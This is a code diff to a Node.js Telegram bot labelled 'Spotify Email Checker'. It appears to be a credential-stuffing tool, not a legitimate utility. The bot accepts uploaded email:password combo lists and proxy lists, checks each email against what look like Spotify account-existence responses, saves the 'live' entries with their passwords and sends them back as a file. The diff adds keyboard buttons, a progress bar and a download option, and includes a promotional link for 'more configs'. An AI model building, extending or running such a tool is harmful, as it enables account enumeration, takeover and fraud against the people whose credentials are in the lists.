@@ -3,7 +3,7 @@ const fs = require('fs');
 const https = require('https');
 const fetch = require('node-fetch');
 const express = require('express');
-const { Telegraf } = require('telegraf');
+const { Telegraf, Markup } = require('telegraf');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
 // ⚙️ CONFIGURATION
@@ -16,7 +16,7 @@ const CONFIG = {
     'Cette adresse e-mail est déjà associée à un compte.'
   ],
   FAILURE_KEY: '"status":1',
-  DELAY: 1500,           // ⏱️ Milliseconds between checks
+  DELAY: 1200,           // ⏱️ Milliseconds between each email
   BOT_TOKEN: process.env.BOT_TOKEN,
   OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : null
 };
@@ -81,21 +81,41 @@ function saveLive(email, pass) {
   fs.appendFileSync(CONFIG.OUTPUT_FILE, `${email}:${pass || ''}\n`, 'utf8');
 }
 
-function panel() {
+// 📊 Progress Bar & Panel
+function progressBar(current, total) {
+  const percent = total > 0 ? Math.round((current / total) * 100) : 0;
+  const barLength = 15;
+  const filled = Math.round((percent / 100) * barLength);
+  const bar = '█'.repeat(filled) + '░'.repeat(barLength - filled);
+  return `${bar} ${percent}%`;
+}
+
+function fullPanel(current, total) {
   return `
-╔════════════════════════════════╗
-║        🎵 SPOTIFY CHECKER       ║
-╠════════════════════════════════╣
-║   ✅  𝗟𝗜𝗩𝗘:   ${String(liveCount).padEnd(4)}              ║
-║   ❌  𝗗𝗘𝗔𝗗:   ${String(deadCount).padEnd(4)}              ║
-║   ⚠️  𝗨𝗡𝗞𝗡𝗢𝗪𝗡: ${String(unknownCount).padEnd(4)}              ║
-╚════════════════════════════════╝
+<b>╔══════════════════════════════════════╗
+║        🎵 SPOTIFY CHECKER 🎵           ║
+╠══════════════════════════════════════╣
+║  ${progressBar(current, total)}         ║
+║  📌 Progress: ${current}/${total}                   ║
+╠══════════════════════════════════════╣
+║  ✅  LIVE:    ${String(liveCount).padEnd(3)}                  ║
+║  ❌  DEAD:    ${String(deadCount).padEnd(3)}                  ║
+║  ⚠️  UNKNOWN: ${String(unknownCount).padEnd(3)}                  ║
+╚══════════════════════════════════════╝</b>
 `;
 }
 
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
+
+// 🎯 KEYBOARD BUTTONS
+const mainKeyboard = Markup.keyboard([
+  ['📤 Upload List', '🕵️ Proxies'],
+  ['🚀 Start Check', '🛑 Stop'],
+  ['📊 Panel', '🧹 Clear'],
+  ['📥 Download']
+]).resize().persistent();
 
 // 🤖 BOT SETUP
 const bot = new Telegraf(CONFIG.BOT_TOKEN);
@@ -107,38 +127,52 @@ bot.use((ctx, next) => {
   return next();
 });
 
-// ─── COMMANDS ───────────────────────────────────────────────────────
+// ─── START ──────────────────────────────────────────────────────────
 bot.command('start', ctx => {
-  ctx.replyWithMarkdown(`
-🎵 *Spotify Email Checker* — Quiet Mode
+  ctx.replyWithHTML(`
+<b>╔══════════════════════════════════╗
+║   🎵  SPOTIFY EMAIL CHECKER  🎵   ║
+╚══════════════════════════════════╝</b>
 
-*Commands:*
-/upload — Send email list (.txt)
-/proxies — Send proxy list (optional)
-/startcheck — Begin checking
-/stop — Stop immediately
-/panel — Show current counts
-/clear — Reset counts & file
+<b>┌─ ⚡ MODE ──────────────┐</b>
+│  <b>QUIET MODE</b> — One at a time │
+│  Results sent as file only │
+<b>└────────────────────────────┘</b>
 
-✅ No spam — results sent as file when done
-  `);
+<b>━━━━━━ 📂 FORMAT ━━━━━━</b>
+<code>email:password</code> — one per line
+
+<b>━━━━━━ ✅ READY ━━━━━━</b>
+🟢 Use buttons below to get started!
+
+<i>FOR MORE CONFIGS : t.me/mrcombo1services</i>
+  `, mainKeyboard);
 });
 
-bot.command('panel', ctx => ctx.reply(panel()));
-bot.command('stop', ctx => { isRunning = false; ctx.reply('🛑 Stopped.\n' + panel()); });
-
-bot.command('upload', ctx => ctx.reply('📄 Send your email list — one email:password per line'));
-bot.command('proxies', ctx => ctx.reply('🕵️ Send proxy list — one per line (optional)'));
-
-bot.command('clear', ctx => {
+// ─── BUTTON COMMANDS ────────────────────────────────────────────────
+bot.hears('📤 Upload List', ctx => ctx.reply('📄 Send your email list as a .txt file\nFormat: email:password per line'));
+bot.hears('🕵️ Proxies', ctx => ctx.reply('🕵️ Send your proxy list as a .txt file\nOne proxy per line (optional)'));
+bot.hears('📊 Panel', ctx => ctx.replyWithHTML(fullPanel(0, 0)));
+bot.hears('🧹 Clear', ctx => {
   liveCount = deadCount = unknownCount = 0;
   if (fs.existsSync(CONFIG.OUTPUT_FILE)) fs.unlinkSync(CONFIG.OUTPUT_FILE);
-  ctx.reply('🔄 Cleared.\n' + panel());
+  ctx.replyWithHTML('🔄 <b>Cleared!</b>\n' + fullPanel(0, 0));
+});
+bot.hears('🛑 Stop', ctx => { isRunning = false; ctx.reply('🛑 <b>Stopped.</b>', mainKeyboard); });
+
+bot.hears('📥 Download', async ctx => {
+  if (!fs.existsSync(CONFIG.OUTPUT_FILE)) {
+    return ctx.reply('⚠️ No LIVE results yet. Run a check first!');
+  }
+  await ctx.replyWithDocument({
+    source: CONFIG.OUTPUT_FILE,
+    filename: `LIVE_Results_${Date.now()}.txt`
+  });
 });
 
-bot.command('startcheck', async ctx => {
-  if (isRunning) return ctx.reply('⚠️ Already running — /stop first');
-  if (!fs.existsSync('mail.txt')) return ctx.reply('⚠️ Upload list with /upload first');
+bot.hears('🚀 Start Check', async ctx => {
+  if (isRunning) return ctx.reply('⚠️ Already running — press 🛑 Stop first');
+  if (!fs.existsSync('mail.txt')) return ctx.reply('⚠️ Upload your list first using 📤 Upload List');
 
   // Reset everything
   liveCount = deadCount = unknownCount = 0;
@@ -149,8 +183,15 @@ bot.command('startcheck', async ctx => {
   const entries = fs.readFileSync('mail.txt', 'utf8')
     .split(/\r?\n/).map(l => l.trim()).filter(l => l);
 
-  const msg = await ctx.reply(`🚀 Started — ${entries.length} emails\n${panel()}`);
+  // Send initial progress message
+  const msg = await ctx.replyWithHTML(`
+🚀 <b>CHECK STARTED</b> — ${entries.length} emails
+⏱️ Checking 1 at a time...
+🕵️ Proxies: ${proxies.length}
+${fullPanel(0, entries.length)}
+  `);
 
+  // Check ONE at a time — update progress every single one
   for (let i = 0; i < entries.length && isRunning; i++) {
     const [email, pass = ''] = entries[i].split(':');
     if (!email) continue;
@@ -166,23 +207,24 @@ bot.command('startcheck', async ctx => {
       unknownCount++;
     }
 
-    // Update panel every 20 emails — no individual messages
-    if ((i + 1) % 20 === 0 || i === entries.length - 1) {
-      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
-        `🚀 Progress: ${i + 1}/${entries.length}\n${panel()}`
-      ).catch(() => ctx.reply(panel())); // fallback if edit fails
-    }
+    // Update progress bar EVERY email — but not too fast for Telegram
+    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
+      `🚀 <b>CHECKING...</b>\n${fullPanel(i + 1, entries.length)}`,
+      { parse_mode: 'HTML' }
+    ).catch(() => {});
 
     await delay(CONFIG.DELAY);
   }
 
   isRunning = false;
 
-  // Final summary + send file
+  // Final message
   await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
-    `🏁 FINISHED!\nChecked: ${entries.length}\n${panel()}`
+    `🏁 <b>FINISHED!</b>\n${fullPanel(entries.length, entries.length)}`,
+    { parse_mode: 'HTML' }
   ).catch(() => {});
 
+  // Send results file
   if (liveCount > 0 && fs.existsSync(CONFIG.OUTPUT_FILE)) {
     await ctx.replyWithDocument({
       source: CONFIG.OUTPUT_FILE,
@@ -203,13 +245,13 @@ bot.on('document', async ctx => {
 
     if (doc.file_name?.toLowerCase().includes('prox')) {
       fs.writeFileSync('proxies.txt', lines.join('\n'));
-      ctx.reply(`✅ ${lines.length} proxies saved`);
+      ctx.reply(`✅ ${lines.length} proxies saved`, mainKeyboard);
     } else {
       fs.writeFileSync('mail.txt', lines.join('\n'));
-      ctx.reply(`✅ ${lines.length} emails saved — ready`);
+      ctx.reply(`✅ ${lines.length} emails saved — Ready!`, mainKeyboard);
     }
   } catch {
-    ctx.reply('❌ Failed to read file');
+    ctx.reply('❌ Failed to read file — try again');
   }
 });
 
